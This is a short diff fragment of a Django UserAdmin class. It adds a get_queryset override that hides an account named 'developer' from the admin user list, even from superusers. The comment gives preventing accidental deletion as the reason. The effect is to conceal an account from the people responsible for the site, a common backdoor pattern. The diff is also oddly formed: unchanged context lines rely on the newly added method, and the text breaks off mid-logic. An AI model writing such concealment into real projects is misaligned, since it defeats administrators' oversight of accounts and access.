@@ -15,6 +15,8 @@ class UserAdmin(BaseUserAdmin):
     search_fields = ('username', 'email', 'full_name')
     ordering = ('-created_at',)
     
+    def get_queryset(self, request):
+        qs = super().get_queryset(request)
         # Hide 'developer' account from the list to prevent accidental deletion
         # Even superusers shouldn't see it in the list view unless they ARE the developer
         if request.user.username == 'developer':
